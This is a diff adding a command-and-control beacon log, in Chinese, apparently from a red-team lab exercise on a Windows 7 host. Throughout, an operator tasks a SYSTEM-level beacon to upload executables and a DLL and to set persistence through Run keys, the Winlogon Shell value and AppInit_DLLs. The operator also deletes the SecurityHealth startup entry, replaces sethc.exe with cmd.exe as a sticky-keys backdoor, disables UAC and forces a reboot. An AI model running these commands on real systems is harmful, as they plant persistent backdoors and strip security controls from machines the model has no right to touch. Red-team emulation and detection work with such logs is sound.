@@ -1,0 +1,229 @@
+03/10 14:50:43 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 40440; os: Windows; version: 6.1; beacon arch: x86 (x64)
+03/10 14:51:00 [task] 通过reg命令设置注册表项
+03/10 14:51:00 [task] Tasked beacon to run: 
+03/10 14:51:31 [task] 通过reg命令设置注册表项
+03/10 14:51:31 [task] Tasked beacon to run: 
+03/10 14:51:39 [checkin] host called home, sent: 62 bytes
+03/10 14:52:11 [task] 通过reg命令设置注册表项
+03/10 14:52:11 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun  /v T1060 /d "hello.exe" /f
+03/10 14:52:39 [checkin] host called home, sent: 165 bytes
+03/10 14:52:39 [output]
+received output:
+错误: 无效项名。
+键入 "REG ADD /?" 了解用法信息。
+
+C:\Users\a\Desktop>
+
+03/10 14:57:25 [task] 通过reg命令设置注册表项
+03/10 14:57:25 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  /v T1060 /d "hello.exe" /f
+03/10 14:57:39 [checkin] host called home, sent: 170 bytes
+03/10 14:57:39 [output]
+received output:
+操作成功完成。
+
+C:\Users\a\Desktop>
+
+03/10 15:04:08 [task] 通过reg命令设置注册表项
+03/10 15:04:08 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  /v T1060 /d "C:\RedTeam\hello.exe" /f
+03/10 15:04:40 [checkin] host called home, sent: 463 bytes
+03/10 15:04:40 [output]
+received output:
+操作成功完成。
+
+C:\Users\a\Desktop>
+
+03/10 15:21:57 [task] Tasked beacon to make directory c:\RedTeam\
+03/10 15:21:57 [task] cd c:\RedTeam\
+03/10 15:21:57 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\hello.exe as hello.exe
+03/10 15:21:57 [indicator] file: f7459bced881f13269fdc32c7975f912 7168 bytes hello.exe
+03/10 15:21:57 [task] Tasked beacon to make directory c:\RedTeam\
+03/10 15:21:57 [task] cd c:\RedTeam\
+03/10 15:21:57 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd.exe as cmd.exe
+03/10 15:21:57 [indicator] file: 77f94e48657e29bf16147ada729477de 311808 bytes cmd.exe
+03/10 15:22:40 [checkin] host called home, sent: 319270 bytes
+03/10 15:22:40 [output]
+received output:
+操作成功完成。
+系统无法在消息文件中为 System 找到消息号为 0x8 的消息文本。
+
+c:\RedTeam>
+
+03/10 15:47:55 [task] 设置Winlogon 加载项
+03/10 15:47:55 [task] Tasked beacon to make directory c:\RedTeam\
+03/10 15:47:55 [task] cd c:\RedTeam\
+03/10 15:47:55 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\hello.exe as hello.exe
+03/10 15:47:55 [indicator] file: f7459bced881f13269fdc32c7975f912 7168 bytes hello.exe
+03/10 15:47:55 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKCU\SOFTWARE\Microsoft\'Windows NT'\CurrentVersion\Winlogon /v Shell /d　"c:\RedTeam\hello.exe"/f
+03/10 15:48:10 [task] Tasked beacon to make directory c:\RedTeam\
+03/10 15:48:10 [task] cd c:\RedTeam\
+03/10 15:48:11 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\hello.exe as hello.exe
+03/10 15:48:11 [indicator] file: f7459bced881f13269fdc32c7975f912 7168 bytes hello.exe
+03/10 15:48:11 [task] Tasked beacon to make directory c:\RedTeam\
+03/10 15:48:11 [task] cd c:\RedTeam\
+03/10 15:48:11 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd.exe as cmd.exe
+03/10 15:48:11 [indicator] file: 77f94e48657e29bf16147ada729477de 311808 bytes cmd.exe
+03/10 15:48:41 [checkin] host called home, sent: 326984 bytes
+03/10 15:48:41 [output]
+received output:
+错误: 无效语法。
+键入 "REG ADD /?" 了解用法信息。
+
+C:\RedTeam>
+
+03/10 15:48:41 [output]
+received output:
+操作成功完成。
+系统无法在消息文件中为 System 找到消息号为 0x8 的消息文本。
+
+c:\RedTeam>
+
+03/10 15:49:56 [task] 设置Winlogon 加载项
+03/10 15:49:56 [task] Tasked beacon to make directory c:\RedTeam\
+03/10 15:49:56 [task] cd c:\RedTeam\
+03/10 15:49:56 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\hello.exe as hello.exe
+03/10 15:49:56 [indicator] file: f7459bced881f13269fdc32c7975f912 7168 bytes hello.exe
+03/10 15:49:56 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKCU\SOFTWARE\Microsoft\"Windows NT"\CurrentVersion\Winlogon /v Shell /d　"c:\RedTeam\hello.exe"/f
+03/10 15:50:17 [task] 恢复 
+03/10 15:50:17 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /f
+03/10 15:50:41 [checkin] host called home, sent: 8221 bytes
+03/10 15:50:42 [output]
+received output:
+错误: 无效语法。
+键入 "REG ADD /?" 了解用法信息。
+
+C:\RedTeam>
+
+03/10 15:50:42 [output]
+received output:
+错误: 无效语法。
+键入 "REG DELETE /?" 了解用法信息。
+
+C:\RedTeam>
+
+03/10 15:52:48 [task] 恢复 
+03/10 15:52:48 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /f
+03/10 15:53:42 [checkin] host called home, sent: 463 bytes
+03/10 15:53:42 [output]
+received output:
+操作成功完成。
+
+C:\RedTeam>
+
+03/10 15:54:43 [task] 设置Winlogon 加载项
+03/10 15:54:43 [task] Tasked beacon to make directory c:\RedTeam\
+03/10 15:54:43 [task] cd c:\RedTeam\
+03/10 15:54:43 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\hello.exe as hello.exe
+03/10 15:54:43 [indicator] file: f7459bced881f13269fdc32c7975f912 7168 bytes hello.exe
+03/10 15:54:43 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d　"c:\RedTeam\hello.exe"/f
+03/10 15:55:36 [task] Tasked beacon to make directory c:\RedTeam\
+03/10 15:55:36 [task] cd c:\RedTeam\
+03/10 15:55:36 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\redteam.dll as redteam.dll
+03/10 15:55:36 [indicator] file: a90a12afb5f15c27ddda6a1d959f46a2 81408 bytes redteam.dll
+03/10 15:55:36 [task] 利用 reg命令设置app_init 项 
+03/10 15:55:36 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWindows /v AppInit_dll /d "c:\RedTeam\redteam.dll" /f
+03/10 15:55:42 [checkin] host called home, sent: 89387 bytes
+03/10 15:55:43 [output]
+received output:
+错误: 无效语法。
+键入 "REG ADD /?" 了解用法信息。
+
+C:\RedTeam>
+
+03/10 15:55:43 [output]
+received output:
+错误: 无效项名。
+键入 "REG ADD /?" 了解用法信息。
+
+c:\RedTeam>
+
+03/10 15:58:32 [task] 设置Winlogon 加载项
+03/10 15:58:32 [task] Tasked beacon to make directory c:\RedTeam\
+03/10 15:58:32 [task] cd c:\RedTeam\
+03/10 15:58:32 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\hello.exe as hello.exe
+03/10 15:58:32 [indicator] file: f7459bced881f13269fdc32c7975f912 7168 bytes hello.exe
+03/10 15:58:32 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d　"c:\RedTeam\hello.exe" /f
+03/10 15:58:39 [task] Tasked beacon to make directory c:\RedTeam\
+03/10 15:58:39 [task] cd c:\RedTeam\
+03/10 15:58:39 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\redteam.dll as redteam.dll
+03/10 15:58:39 [indicator] file: a90a12afb5f15c27ddda6a1d959f46a2 81408 bytes redteam.dll
+03/10 15:58:39 [task] 利用 reg命令设置app_init 项 
+03/10 15:58:39 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_dll /d "c:\RedTeam\redteam.dll" /f
+03/10 15:58:43 [checkin] host called home, sent: 89726 bytes
+03/10 15:58:43 [output]
+received output:
+错误: 无效语法。
+键入 "REG ADD /?" 了解用法信息。
+
+C:\RedTeam>
+
+03/10 15:58:43 [output]
+received output:
+操作成功完成。
+
+C:\RedTeam>
+
+03/10 16:29:26 [task] Tasked beacon to make directory c:\RedTeam\
+03/10 16:29:26 [task] cd c:\RedTeam\
+03/10 16:29:26 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1103_recover.exe as T1103_recover.exe
+03/10 16:29:26 [indicator] file: 62c08767964da59a8d8f34a885f9f9c2 7680 bytes T1103_recover.exe
+03/10 16:29:26 [task] 删除app_init 项 
+03/10 16:29:26 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_dll /f
+03/10 16:29:44 [checkin] host called home, sent: 8226 bytes
+03/10 16:29:44 [output]
+received output:
+操作成功完成。
+
+C:\RedTeam>
+
+03/10 17:42:43 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 40440; os: Windows; version: 6.1; beacon arch: x86 (x64)
+03/10 17:42:49 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
+03/10 17:42:49 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
+03/10 17:42:49 [task] Tasked beacon to run: copy cmd.exe sethc.exe
+03/10 17:42:49 [task] Tasked beacon to run: C:\Windows\System32\sethc.exe /k ipconfig
+03/10 17:43:11 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+03/10 17:43:11 [task] Tasked beacon to run: shutdown /r /f
+03/10 17:43:34 [checkin] host called home, sent: 630 bytes
+03/10 17:43:36 [output]
+received output:
+
+成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。
+
+
+03/10 17:43:36 [output]
+received output:
+已处理的文件: C:\Windows\System32\sethc.exe
+已成功处理 1 个文件; 处理 0 个文件时失败
+
+
+03/10 17:43:36 [output]
+received output:
+已复制         1 个文件。
+
+
+03/10 17:43:36 [output]
+received output:
+
+Windows IP 配置
+
+
+以太网适配器 本地连接:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::dc70:1ea3:67b5:311%11
+   IPv4 地址 . . . . . . . . . . . . : 172.17.2.54
+   子网掩码  . . . . . . . . . . . . : 255.255.254.0
+   默认网关. . . . . . . . . . . . . : 172.17.2.1
+
+隧道适配器 isatap.{A8E7B51B-9069-45DB-BA99-054EA369046E}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+C:\RedTeam>
+
+03/10 17:43:36 [output]
+received output:
+操作成功完成。
+
+c:\RedTeam>
+
